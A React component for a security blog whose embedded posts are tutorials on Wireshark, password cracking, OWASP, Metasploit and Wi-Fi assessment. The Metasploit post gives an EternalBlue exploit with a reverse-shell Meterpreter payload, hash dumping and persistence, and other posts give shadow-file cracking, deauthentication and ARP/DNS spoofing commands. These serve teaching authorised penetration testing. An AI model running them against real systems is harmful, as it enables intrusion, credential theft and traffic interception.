"use client";

import { useTranslations } from "next-intl";
import { useLocale } from "next-intl";
import Link from "next/link";
import dynamic from "next/dynamic";
import { Clock, ArrowLeft, Shield, Bug, Terminal, Wifi, Server, Code2, Calendar, User } from "lucide-react";
const MatrixRain = dynamic(() => import("@/components/three/MatrixRain"), { ssr: false });
import RevealOnScroll from "@/components/animations/RevealOnScroll";

const CATEGORY_COLORS: Record<string, string> = {
  Tools: "#9fef00",
  Security: "#00d4ff",
  DevSecOps: "#b44aff",
  Tutorials: "#ff6600",
  Guides: "#ef476f",
  Wireless: "#ffd166",
};

const CATEGORY_ICONS: Record<string, typeof Shield> = {
  Tools: Terminal,
  Security: Shield,
  DevSecOps: Code2,
  Tutorials: Bug,
  Guides: Server,
  Wireless: Wifi,
};

interface BlogPost {
  slug: string;
  title: string;
  category: string;
  readTime: number;
  date: string;
  author: string;
  excerpt: string;
  content: string;
  tags: string[];
}

const BLOG_POSTS: Record<string, BlogPost> = {
  "mastering-wireshark": {
    slug: "mastering-wireshark",
    title: "Mastering Wireshark: Network Traffic Analysis Deep Dive",
    category: "Tools",
    readTime: 12,
    date: "2026-01-15",
    author: "Semih Kilic",
    excerpt: "Advanced packet capture and analysis techniques — from protocol dissection to identifying malicious traffic patterns in real-time.",
    tags: ["wireshark", "network-analysis", "packet-capture", "traffic-analysis"],
    content: `
## Introduction

Wireshark is the world's foremost and widely-used network protocol analyzer. It lets you see what's happening on your network at a microscopic level. In this deep dive, we'll cover advanced techniques that go beyond basic packet capture.

## Setting Up Capture Filters

Before capturing traffic, it's crucial to set up proper capture filters to reduce noise:

\`\`\`
# Capture only HTTP/HTTPS traffic
tcp port 80 or tcp port 443

# Capture traffic from a specific subnet
net 192.168.1.0/24

# Capture DNS queries only
udp port 53
\`\`\`

## Display Filters for Forensic Analysis

Once you have captured data, display filters help you isolate relevant packets:

\`\`\`
# Find HTTP POST requests (potential data exfiltration)
http.request.method == "POST"

# Find DNS queries to suspicious TLDs
dns.qry.name contains ".xyz" or dns.qry.name contains ".top"

# Detect potential C2 beaconing (regular interval connections)
tcp.flags.syn == 1 && tcp.flags.ack == 0
\`\`\`

## Identifying Malicious Traffic Patterns

### 1. DNS Tunneling Detection
Look for unusually long DNS queries or high-frequency DNS requests to the same domain. DNS tunneling often uses TXT records with base64-encoded data.

### 2. Beaconing Analysis
C2 (Command and Control) traffic often shows regular intervals. Use the Statistics > Conversations feature to identify hosts with periodic connections.

### 3. Data Exfiltration Indicators
- Large outbound data transfers during off-hours
- Encrypted connections to non-standard ports
- HTTP POST requests with large payloads to unknown domains

## Protocol Dissection

Wireshark's protocol dissectors allow deep inspection of application-layer protocols. Custom dissectors can be written in Lua for proprietary protocols.

## TShark for Automated Analysis

For automated analysis pipelines, TShark (Wireshark's CLI) is invaluable:

\`\`\`bash
# Extract all HTTP URLs from a capture
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Count connections per source IP
tshark -r capture.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -20

# Export specific streams
tshark -r capture.pcap -Y "tcp.stream eq 5" -w stream5.pcap
\`\`\`

## Best Practices

1. **Always capture with proper authorization** — Unauthorized packet capture may violate laws
2. **Use ring buffers** for continuous monitoring to avoid disk space issues
3. **Encrypt your captures** as they may contain sensitive data
4. **Timestamp analysis** is crucial for incident response timelines
5. **Combine with other tools** like Zeek (Bro) for automated threat detection

## Conclusion

Mastering Wireshark requires practice and understanding of network protocols. Start with your own lab environment, analyze known-good traffic first, then gradually move to more complex scenarios. The key is understanding what "normal" looks like so you can identify anomalies.
    `,
  },
  "hashcat-vs-john": {
    slug: "hashcat-vs-john",
    title: "Hashcat vs John the Ripper: Password Cracking Compared",
    category: "Tools",
    readTime: 10,
    date: "2026-01-12",
    author: "Semih Kilic",
    excerpt: "GPU-accelerated password recovery showdown. Benchmarks, rule-based attacks, and choosing the right tool for the job.",
    tags: ["hashcat", "john-the-ripper", "password-cracking", "GPU"],
    content: `
## Overview

Password cracking is an essential skill in penetration testing. Two tools dominate this space: **Hashcat** (GPU-focused) and **John the Ripper** (CPU-focused with GPU support). Let's compare them head-to-head.

## GPU vs CPU Performance

| Hash Type | Hashcat (RTX 4090) | John the Ripper (CPU) | Speed Ratio |
|-----------|--------------------|-----------------------|-------------|
| MD5 | 164 GH/s | 850 MH/s | 193x |
| SHA-256 | 22 GH/s | 320 MH/s | 69x |
| bcrypt | 184 kH/s | 45 kH/s | 4x |
| NTLM | 300 GH/s | 1.2 GH/s | 250x |

## Attack Modes

### Hashcat Attack Modes
- **Dictionary Attack** (-a 0): Straight wordlist attack
- **Combination Attack** (-a 1): Combine two wordlists
- **Brute-Force** (-a 3): Mask-based attack
- **Rule-Based** (-a 0 -r rules): Apply transformation rules
- **Hybrid** (-a 6, -a 7): Wordlist + mask combinations

### John the Ripper Modes
- **Single Crack**: Uses login names and GECOS info
- **Wordlist**: Dictionary with optional rules
- **Incremental**: Brute-force with character frequency optimization
- **External**: Custom cracking modes via C-like config

## When to Use Which

**Choose Hashcat when:**
- You have a powerful GPU
- Cracking large hash lists
- Need maximum speed for common hash types
- Working with modern hash algorithms

**Choose John the Ripper when:**
- Working with exotic/uncommon hash formats
- Need automatic hash detection
- Running on servers without GPUs
- Need incremental mode's smart brute-force

## Practical Example

\`\`\`bash
# Hashcat: Crack NTLM hashes with rockyou
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John: Crack shadow file
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=All /etc/shadow

# Hashcat: Mask attack for 8-char passwords
hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?s
\`\`\`

## Conclusion

Both tools are essential in a penetration tester's arsenal. Use Hashcat for raw GPU power and John for versatility. Many professionals use both in their workflows.
    `,
  },
  "owasp-top-10-2026": {
    slug: "owasp-top-10-2026",
    title: "OWASP Top 10 in 2026: What's Changed",
    category: "Security",
    readTime: 12,
    date: "2026-01-08",
    author: "Semih Kilic",
    excerpt: "An updated look at the most critical web application security risks and how to mitigate them with modern tools.",
    tags: ["OWASP", "web-security", "top-10", "application-security"],
    content: `
## The Evolving Threat Landscape

The OWASP Top 10 continues to evolve as web technologies advance. In 2026, several categories have shifted to reflect modern application architectures including microservices, serverless, and AI-integrated applications.

## Key Changes from 2021

### 1. AI/ML Security Risks (NEW)
With the proliferation of AI-powered applications, new attack vectors have emerged:
- **Prompt Injection** — Manipulating LLM inputs to bypass safety controls
- **Training Data Poisoning** — Compromising model training pipelines
- **Model Inversion** — Extracting sensitive training data from models

### 2. API Security Misconfigurations (Elevated)
APIs now account for over 80% of web traffic. Common issues include:
- Broken Object Level Authorization (BOLA)
- Excessive data exposure in API responses
- Missing rate limiting and resource quotas

### 3. Supply Chain Vulnerabilities (Elevated)
The software supply chain remains a critical attack surface:
- Dependency confusion attacks
- Compromised CI/CD pipelines
- Malicious package injection

## Mitigation Strategies

1. **Shift-Left Security**: Integrate security testing into CI/CD pipelines
2. **Zero Trust Architecture**: Never trust, always verify
3. **SBOM (Software Bill of Materials)**: Track all dependencies
4. **AI Security Testing**: Specialized tools for LLM applications
5. **API Gateway Security**: Centralized API protection

## Using CyberSec Pro for OWASP Testing

CyberSec Pro's automated scanning engine covers all OWASP Top 10 categories with tools like:
- **Nikto** for web server misconfiguration detection
- **SQLMap** for injection testing
- **OWASP ZAP** for comprehensive web app scanning
- **Nuclei** for template-based vulnerability detection

## Conclusion

Stay ahead of threats by continuously testing your applications against the latest OWASP guidelines. Automated tools combined with manual testing provide the best coverage.
    `,
  },
  "metasploit-zero-to-exploit": {
    slug: "metasploit-zero-to-exploit",
    title: "Metasploit Framework: From Zero to Exploit",
    category: "Tutorials",
    readTime: 15,
    date: "2026-01-05",
    author: "Semih Kilic",
    excerpt: "Hands-on walkthrough of the Metasploit Framework — modules, payloads, encoders, and post-exploitation techniques.",
    tags: ["metasploit", "exploitation", "penetration-testing", "post-exploitation"],
    content: `
## Getting Started with Metasploit

The Metasploit Framework is the world's most used penetration testing software. This tutorial walks you through from installation to your first exploit.

## Architecture Overview

Metasploit's modular architecture consists of:
- **Exploits**: Code that takes advantage of vulnerabilities
- **Payloads**: Code that runs after exploitation (shells, Meterpreter)
- **Auxiliaries**: Scanning, fuzzing, and information gathering modules
- **Post-Exploitation**: Modules for privilege escalation, persistence, pivoting
- **Encoders**: Obfuscation to evade detection

## Basic Workflow

\`\`\`bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 exploit(ms17_010_eternalblue) > show options

# Set target and payload
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50

# Execute
msf6 > exploit
\`\`\`

## Meterpreter Post-Exploitation

Once you have a Meterpreter session:

\`\`\`bash
# System information
meterpreter > sysinfo

# Dump password hashes
meterpreter > hashdump

# Screenshot
meterpreter > screenshot

# Privilege escalation
meterpreter > getsystem

# Persistence
meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.1.50

# Pivoting
meterpreter > run autoroute -s 10.0.0.0/24
\`\`\`

## Important: Legal & Ethical Considerations

**Always ensure you have written authorization before testing.** Unauthorized access to computer systems is illegal. Use dedicated lab environments or authorized bug bounty programs.

## Conclusion

Metasploit is an incredibly powerful framework. Master it in a controlled lab environment before using it in production assessments.
    `,
  },
  "ci-cd-pentest-automation": {
    slug: "ci-cd-pentest-automation",
    title: "Automating Penetration Tests with CI/CD",
    category: "DevSecOps",
    readTime: 10,
    date: "2026-01-03",
    author: "Semih Kilic",
    excerpt: "Integrate security testing into your development pipeline with CyberSec Pro's API and GitHub Actions.",
    tags: ["CI/CD", "automation", "DevSecOps", "GitHub-Actions"],
    content: `
## Why Automate Security Testing?

Manual penetration testing is thorough but slow. By integrating automated security scans into your CI/CD pipeline, you can:
- **Catch vulnerabilities early** in the development lifecycle
- **Reduce remediation costs** (fixing in dev is 10x cheaper than production)
- **Ensure continuous compliance** with security standards
- **Scale security testing** across multiple projects

## CyberSec Pro API Integration

\`\`\`yaml
# .github/workflows/security-scan.yml
name: Security Scan
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Trigger CyberSec Pro Scan
        run: |
          curl -X POST https://semihkilic.com/api/v1/scans \\
            -H "Authorization: Bearer \${{ secrets.CYBERSEC_API_KEY }}" \\
            -H "Content-Type: application/json" \\
            -d '{
              "target": "\${{ github.event.repository.homepage }}",
              "tool_id": "nikto",
              "options": {"tuning": "1234567890"}
            }'
\`\`\`

## Pipeline Architecture

1. **Pre-commit**: Secret scanning, dependency audit
2. **Build**: SAST (Static Analysis), container scanning
3. **Deploy (Staging)**: DAST (Dynamic Analysis) with CyberSec Pro
4. **Post-Deploy**: Continuous monitoring, vulnerability alerts

## Best Practices

- Never block deployments on informational findings
- Set severity thresholds (block on Critical/High only)
- Keep scan results in a centralized dashboard
- Automate ticket creation for new vulnerabilities
- Schedule weekly full scans in addition to pipeline scans

## Conclusion

DevSecOps is not optional — it's essential. Start small with automated dependency checks, then gradually add DAST and infrastructure scanning to your pipeline.
    `,
  },
  "wireless-security-assessment": {
    slug: "wireless-security-assessment",
    title: "Wireless Security Assessment Best Practices",
    category: "Wireless",
    readTime: 9,
    date: "2025-12-15",
    author: "Semih Kilic",
    excerpt: "Comprehensive guide to testing Wi-Fi network security using aircrack-ng, wifite, and bettercap.",
    tags: ["wireless", "WiFi", "aircrack-ng", "wifite", "bettercap"],
    content: `
## Wireless Security Testing Methodology

Wireless networks present unique attack surfaces. This guide covers the essential tools and techniques for assessing Wi-Fi security.

## Essential Tools

### Aircrack-ng Suite
The foundational toolkit for wireless assessment:

\`\`\`bash
# Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake for specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (to capture handshake)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2 handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
\`\`\`

### Wifite (Automated)
For rapid assessment of multiple networks:

\`\`\`bash
# Automated scan and attack
wifite --kill --no-reaver

# Target specific encryption
wifite --wpa --dict /path/to/wordlist.txt
\`\`\`

### Bettercap (MITM)
For man-in-the-middle testing:

\`\`\`bash
# Start bettercap
bettercap -iface wlan0

# ARP spoofing
> set arp.spoof.targets 192.168.1.0/24
> arp.spoof on

# DNS spoofing
> set dns.spoof.domains example.com
> dns.spoof on
\`\`\`

## Assessment Checklist

1. **Encryption Strength**: WPA3 > WPA2-AES > WPA2-TKIP > WEP (never use)
2. **SSID Security**: Disable SSID broadcast in sensitive environments
3. **Client Isolation**: Prevent lateral movement between wireless clients
4. **Rogue AP Detection**: Monitor for evil twin attacks
5. **802.1X/RADIUS**: Enterprise authentication for corporate networks

## Legal Warning

**Wireless testing must only be performed on networks you own or have explicit written permission to test.** Unauthorized wireless access is a criminal offense in most jurisdictions.

## Conclusion

Regular wireless security assessments are essential for any organization. Combine automated scanning with manual testing for comprehensive coverage.
    `,
  },
};

function formatDate(dateStr: string, locale: string) {
  return new Date(dateStr).toLocaleDateString(locale === "tr" ? "tr-TR" : locale === "de" ? "de-DE" : "en-US", {
    month: "long",
    day: "numeric",
    year: "numeric",
  });
}

export default function BlogPostPage({ slug }: { slug: string }) {
  const t = useTranslations("blog");
  const locale = useLocale();
  const post = BLOG_POSTS[slug];

  if (!post) {
    return (
      <>
        <MatrixRain />
        <section className="relative pb-16 pt-32 text-center">
          <div className="mx-auto max-w-2xl px-6">
            <h1 className="text-3xl font-extrabold text-white mb-4">Article Not Found</h1>
            <p className="text-white/50 mb-8">The article you&apos;re looking for doesn&apos;t exist or has been moved.</p>
            <Link
              href={`/${locale}/blog`}
              className="inline-flex items-center gap-2 rounded-xl border border-white/10 px-6 py-3 font-mono text-sm font-medium text-white/60 transition-all hover:border-[var(--color-neon-dim)] hover:text-[var(--color-neon)]"
            >
              <ArrowLeft size={14} /> Back to Blog
            </Link>
          </div>
        </section>
      </>
    );
  }

  const color = CATEGORY_COLORS[post.category] || "#9fef00";
  const Icon = CATEGORY_ICONS[post.category] || Shield;

  return (
    <>
      <MatrixRain />
      {/* Header */}
      <section className="relative pb-8 pt-28">
        <div className="mx-auto max-w-3xl px-6">
          <RevealOnScroll>
            <Link
              href={`/${locale}/blog`}
              className="inline-flex items-center gap-2 text-sm text-white/40 hover:text-[var(--color-neon)] transition mb-8"
            >
              <ArrowLeft size={14} /> {t("backToBlog") ?? "Back to Blog"}
            </Link>

            <div className="flex items-center gap-3 mb-4">
              <span
                className="flex items-center gap-1.5 rounded-full px-3 py-1 text-xs font-semibold"
                style={{ background: `${color}15`, color }}
              >
                <Icon size={12} />
                {post.category}
              </span>
            </div>

            <h1 className="text-3xl font-extrabold text-white md:text-4xl lg:text-5xl leading-tight mb-6">
              {post.title}
            </h1>

            <p className="text-lg text-white/50 mb-6">{post.excerpt}</p>

            <div className="flex flex-wrap items-center gap-4 text-sm text-white/30 border-b border-white/5 pb-6">
              <span className="flex items-center gap-1.5">
                <User size={14} /> {post.author}
              </span>
              <span className="flex items-center gap-1.5">
                <Calendar size={14} /> {formatDate(post.date, locale)}
              </span>
              <span className="flex items-center gap-1.5">
                <Clock size={14} /> {post.readTime} min read
              </span>
            </div>
          </RevealOnScroll>
        </div>
      </section>

      {/* Content */}
      <section className="pb-20">
        <div className="mx-auto max-w-3xl px-6">
          <RevealOnScroll>
            <article className="prose prose-invert prose-sm max-w-none
              prose-headings:text-white prose-headings:font-bold
              prose-h2:text-xl prose-h2:mt-10 prose-h2:mb-4 prose-h2:border-b prose-h2:border-white/5 prose-h2:pb-2
              prose-h3:text-lg prose-h3:mt-6 prose-h3:mb-3
              prose-p:text-white/60 prose-p:leading-relaxed
              prose-strong:text-white
              prose-code:text-[var(--color-neon)] prose-code:bg-white/5 prose-code:px-1.5 prose-code:py-0.5 prose-code:rounded prose-code:text-sm
              prose-pre:bg-[#0a0a0a] prose-pre:border prose-pre:border-white/10 prose-pre:rounded-xl
              prose-li:text-white/60
              prose-table:text-sm
              prose-th:text-white prose-th:bg-white/5 prose-th:px-4 prose-th:py-2
              prose-td:text-white/60 prose-td:px-4 prose-td:py-2 prose-td:border-b prose-td:border-white/5
              prose-a:text-[var(--color-neon)] prose-a:no-underline hover:prose-a:underline
              prose-blockquote:border-[var(--color-neon)]/30 prose-blockquote:text-white/50
            " dangerouslySetInnerHTML={{ __html: renderMarkdown(post.content) }} />
          </RevealOnScroll>

          {/* Tags */}
          <div className="mt-12 pt-6 border-t border-white/5">
            <div className="flex flex-wrap gap-2">
              {post.tags.map(tag => (
                <span key={tag} className="px-3 py-1 bg-white/5 border border-white/10 rounded-full text-xs text-white/40">
                  #{tag}
                </span>
              ))}
            </div>
          </div>

          {/* Back link */}
          <div className="mt-8">
            <Link
              href={`/${locale}/blog`}
              className="inline-flex items-center gap-2 rounded-xl border border-white/10 px-6 py-3 font-mono text-sm font-medium text-white/60 transition-all hover:border-[var(--color-neon-dim)] hover:text-[var(--color-neon)]"
            >
              <ArrowLeft size={14} /> {t("backToBlog") ?? "Back to All Articles"}
            </Link>
          </div>
        </div>
      </section>
    </>
  );
}

/** Simple markdown-to-HTML renderer for blog content */
function renderMarkdown(md: string): string {
  return md
    .replace(/^### (.*$)/gm, '<h3>$1</h3>')
    .replace(/^## (.*$)/gm, '<h2>$1</h2>')
    .replace(/^# (.*$)/gm, '<h1>$1</h1>')
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.*?)\*/g, '<em>$1</em>')
    .replace(/```(\w*)\n([\s\S]*?)```/g, '<pre><code class="language-$1">$2</code></pre>')
    .replace(/`(.*?)`/g, '<code>$1</code>')
    .replace(/^\| (.+) \|$/gm, (match) => {
      const cells = match.split('|').filter(c => c.trim()).map(c => c.trim());
      return '<tr>' + cells.map(c => c.match(/^[-:]+$/) ? '' : `<td>${c}</td>`).join('') + '</tr>';
    })
    .replace(/^- (.*$)/gm, '<li>$1</li>')
    .replace(/^(\d+)\. (.*$)/gm, '<li>$2</li>')
    .replace(/(<li>[\s\S]*<\/li>)/, '<ul>$1</ul>')
    .replace(/\n\n/g, '</p><p>')
    .replace(/^(?!<[hupoltd])/gm, '')
    .replace(/<p><\/p>/g, '')
    .replace(/<tr><td>[-:]+<\/td>.*?<\/tr>/g, '')
    ;
}
